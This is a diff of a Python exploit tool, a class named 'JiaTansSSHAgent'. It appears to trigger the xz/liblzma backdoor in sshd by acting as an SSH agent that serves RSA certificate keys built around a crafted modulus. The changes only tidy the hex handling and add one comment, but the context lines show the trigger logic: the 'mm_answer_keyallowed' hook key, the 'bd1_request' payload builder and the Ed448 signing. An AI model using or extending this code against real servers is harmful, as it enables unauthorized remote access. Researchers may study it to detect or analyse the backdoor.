@@ -2,7 +2,6 @@ import os
 import sys
 import socket
 import struct
-import binascii
 import hashlib
 
 from cryptography.hazmat.primitives.asymmetric.ed448 import Ed448PrivateKey
@@ -159,18 +158,18 @@ class JiaTansSSHAgent:
 
     def build_key_with_cert(self, new_n):
         # XXX: clean this up some day
-        d = binascii.unhexlify("0000001c7373682d7273612d636572742d763031406f70656e7373682e636f6d00000000000000030100010000010101")
+        d = bytes.fromhex("0000001c7373682d7273612d636572742d763031406f70656e7373682e636f6d00000000000000030100010000010101")
         d += b"\x00"*0x108
         d += b"\x00\x00\x00\x01"
         d += b"\x00"*0x24
         d += struct.pack(">L", 0x114)
-        d += binascii.unhexlify("000000077373682d727361000000010100000100")
+        d += bytes.fromhex("000000077373682d727361000000010100000100")
         d += new_n
-        d += binascii.unhexlify("00000010000000077373682d7273610000000100")
+        d += bytes.fromhex("00000010000000077373682d7273610000000100")
         return d
 
     def build_key(self, new_n):
-        return binascii.unhexlify("000000077373682d72736100000003010001") + \
+        return bytes.fromhex("000000077373682d72736100000003010001") + \
             struct.pack(">L", len(new_n)) + new_n
 
 
@@ -215,6 +214,7 @@ class JiaTansSSHAgent:
         print("[>] building mm_answer_keyallowed hook trigger rsa key..")
 
         newkeys = [
+            # ((0x40 * 0x80000000) + 0xffffffe000000000) & 0xffffffff == 0
             self.build_key_with_cert(self.bd1_request(
                 0x40, 0x80000000, 0xffffffe000000000, 
                 [0,0,0,0,0], b"", 0x100))
@@ -285,8 +285,8 @@ class JiaTansSSHAgent:
             print("[i] hostkey type     : %s" % hostkey_type_str)
             self.hostkey_pub = hashlib.sha256(hostkey_body).digest()
             self.session_id = c[2]
-            print("[i] got session id   : %s" % binascii.hexlify(self.session_id))
-            print("[i] got hostkey salt : %s" % binascii.hexlify(self.hostkey_pub))
+            print("[i] got session id   : %s" % self.session_id.hex())
+            print("[i] got hostkey salt : %s" % self.hostkey_pub.hex())
             self.send_response(sock, struct.pack(">BI", SSH_AGENT_SUCCESS, 0))
         else:
             print("[!] unsupported ssh agent request (%02x).." % msg_type)
